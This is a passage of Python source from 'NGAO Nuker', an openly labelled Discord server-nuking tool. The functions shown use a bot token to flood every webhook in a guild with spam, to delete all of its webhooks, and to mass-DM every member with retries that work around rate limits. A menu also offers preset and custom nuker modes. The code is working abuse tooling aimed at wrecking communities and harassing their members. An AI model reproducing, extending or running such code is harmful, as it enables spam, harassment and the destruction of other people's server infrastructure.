            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        all_webhooks = []
        for channel in guild.channels:
            if hasattr(channel, "webhooks"):
                try:
                    webhooks = await channel.webhooks()
                    all_webhooks.extend(webhooks)
                except Exception as e:
                    print(
                        f"{FAILED()} Could not fetch webhooks in '{channel.name}' {red}->{white} {e}{reset}"
                    )

        if not all_webhooks:
            print(f"{FAILED()} No webhooks found in this guild.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return

        print(f"{LOADING()} Found {len(all_webhooks)} webhooks. Starting spam..{reset}")

        async def spam_webhook(webhook, message, count):
            for _ in range(count):
                try:
                    await webhook.send(content=message, username=webhook.name)
                    print(f"{SUCCESS()} Webhook '{webhook.name}' sent a message.")
                except Exception as e:
                    print(
                        f"{FAILED()} Webhook '{webhook.name}' failed to send message. {red}->{white} {e}{reset}"
                    )

        tasks = []
        for webhook in all_webhooks:
            for _ in range(10):
                tasks.append(spam_webhook(webhook, SpamMessage, SpamCount))

        await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Mass Delete Webhooks =========================


def MassDeleteWebhooks():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.manage_webhooks:
            print(
                f"{FAILED()} The bot does not have permission to manage webhooks.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        all_webhooks = []
        for channel in guild.channels:
            if hasattr(channel, "webhooks"):
                try:
                    webhooks = await channel.webhooks()
                    all_webhooks.extend(webhooks)
                except Exception as e:
                    print(
                        f"{FAILED()} Could not fetch webhooks in '{channel.name}' {red}->{white} {e}{reset}"
                    )

        if not all_webhooks:
            print(f"{FAILED()} No webhooks found in this guild.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return

        print(f"{LOADING()} Found {len(all_webhooks)} webhooks. Deleting..{reset}")

        deleted = 0
        for webhook in all_webhooks:
            try:
                await webhook.delete()
                print(f"{SUCCESS()} Webhook '{webhook.name}' deleted.")
                deleted += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                print(
                    f"{FAILED()} Failed to delete webhook '{webhook.name}'. {red}->{white} {e}{reset}"
                )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Mass DM All Members =========================


def MassDMAllMembers():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    DMMessage = TypeWriterInput(f"{INPUT()} Message To Send {red}->{reset} ").strip()
    if not DMMessage:
        print(f"{FAILED()} Message cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        DMCount = int(
            TypeWriterInput(
                f"{INPUT()} Number Of Messages Per DM {red}->{reset} "
            ).strip()
        )
        if DMCount <= 0 or DMCount > 10:
            print(f"{FAILED()} The number must be between 1 and 10.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    intents.dm_messages = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")
        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have admin permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        print(f"{LOADING()} Fetching members..{reset}")
        members = [m for m in guild.members if not m.bot]
        print(f"{INFORMATION()} {len(members)} Members to DM.{reset}")

        sent = 0
        failed = 0

        async def dm_member(member):
            nonlocal sent, failed
            for i in range(DMCount):
                try:
                    await member.send(DMMessage)
                    sent += 1
                    print(f"{SUCCESS()} DM sent to '{member}' ({i+1}/{DMCount}){reset}")
                except discord.Forbidden:
                    failed += 1
                    print(
                        f"{FAILED()} Unable to DM '{member}' {red}->{white} forbidden.{reset}"
                    )
                    break
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Pausing {retry_after} sec..{reset}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await member.send(DMMessage)
                            sent += 1
                            print(
                                f"{SUCCESS()} DM sent to '{member}' after retry.{reset}"
                            )
                        except Exception as e2:
                            failed += 1
                            print(
                                f"{FAILED()} Retry failed for '{member}' {red}->{white} {e2}{reset}"
                            )
                            break
                    else:
                        failed += 1
                        print(
                            f"{FAILED()} HTTP Error For '{member}' {red}->{white} {e}{reset}"
                        )
                        break
                except Exception as e:
                    failed += 1
                    print(
                        f"{FAILED()} Unexpected Error For '{member}' {red}->{white} {e}{reset}"
                    )
                    break

        batch_size = 10
        for i in range(0, len(members), batch_size):
            batch = members[i : i + batch_size]
            await asyncio.gather(*(dm_member(member) for member in batch))
            await asyncio.sleep(1.5)

        print(
            f"{INFORMATION()} Finish, return to main. (Success:{green} {sent} {white}| Failure:{red} {failed}{white}){reset}"
        )
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Main =========================


def NgaoNukerMenu():
    SetTitle("Main")
    Clear()
    NGAONuker = f"""
                  ███▄    █   ▄████  ▄▄▄       ▒█████      ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                  ██ ▀█   █  ██▒ ▀█▒▒████▄    ▒██▒  ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                 ▓██  ▀█ ██▒▒██░▄▄▄░▒██  ▀█▄  ▒██░  ██▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
                 ▓██▒  ▐▌██▒░▓█  ██▓░██▄▄▄▄██ ▒██   ██░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                 ▒██░   ▓██░░▒▓███▀▒ ▓█   ▓██▒░ ████▓▒░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
                 ░ ▒░   ▒ ▒  ░▒   ▒  ▒▒   ▓▒█░░ ▒░▒░▒░    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                 ░ ░░   ░ ▒░  ░   ░   ▒   ▒▒ ░  ░ ▒ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                    ░   ░ ░ ░ ░   ░   ░   ▒   ░ ░ ░ ▒        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                          ░       ░       ░  ░    ░ ░              ░    ░     ░  ░      ░  ░   ░   
                          
{start}?{end}{white} User ID {red}->{white} {GenerateUserID()}{reset}           
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                    {white}V2.0 {red}// {white}github.com/RyzenGT/NGAO-Nuker {red}// {white}Made By RyzenGT {red}// {white}Discord Nuker Tool{reset}                    ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"""
    ScrollGradient(NGAONuker)

    if Config.get("User-Config", {}).get("FirstRun", "No") == "Yes":
        while True:
            choice = (
                TypeWriterInput(
                    f"{INPUT()} Hello new user, would you like to check out the help menu before you start using NGAO Nuker? (y/n) {red}->{reset} "
                )
                .strip()
                .lower()
            )
            if choice in ["y", "yes"]:
                Config["User-Config"]["FirstRun"] = "No"
                SaveConfig(Config)
                print(f"{LOADING()} Please wait..")
                time.sleep(random.uniform(1, 2))
                HelpMenu()
                break
            elif choice in ["n", "no"]:
                Config["User-Config"]["FirstRun"] = "No"
                SaveConfig(Config)
                break
            else:
                InvalidChoice()

    AskForToken()

    Scroll(
        f"""
{CHOICE()} {start}01{end}{white} Help Menu
{CHOICE()} {start}02{end}{white} Preset Nuker
{CHOICE()} {start}03{end}{white} Custom Nuker
{CHOICE()} {start}04{end}{white} Advanced Menu
{CHOICE()} {start}05{end}{white} Exit NGAO Nuker"""
    )
    ChoiceNukerType = (
        TypeWriterInput(f"{INPUT()} Enter A Choice {red}->{reset} ").lstrip("0").strip()
    )
    if ChoiceNukerType == "1":
        print(f"{LOADING()} Please wait..")
        time.sleep(random.uniform(1, 2))
        HelpMenu()
    elif ChoiceNukerType == "2":
        print(f"{LOADING()} Please wait..")
        time.sleep(random.uniform(1, 2))
        PresetNuker()
    elif ChoiceNukerType == "3":
        print(f"{LOADING()} Please wait..")
        time.sleep(random.uniform(1, 2))
        CustomNuker()
    elif ChoiceNukerType == "4":
        print(f"{LOADING()} Please wait..")
        time.sleep(random.uniform(1, 2))
        AdvancedMenu()
    elif ChoiceNukerType == "5":
        print(f"{INFORMATION()} Exiting NGAO Nuker, Goodbye.{reset}")
        time.sleep(1)
        exit(0)
    else:
        InvalidChoice()


if __name__ == "__main__":
    NgaoNukerMenu()

# ========================= End =========================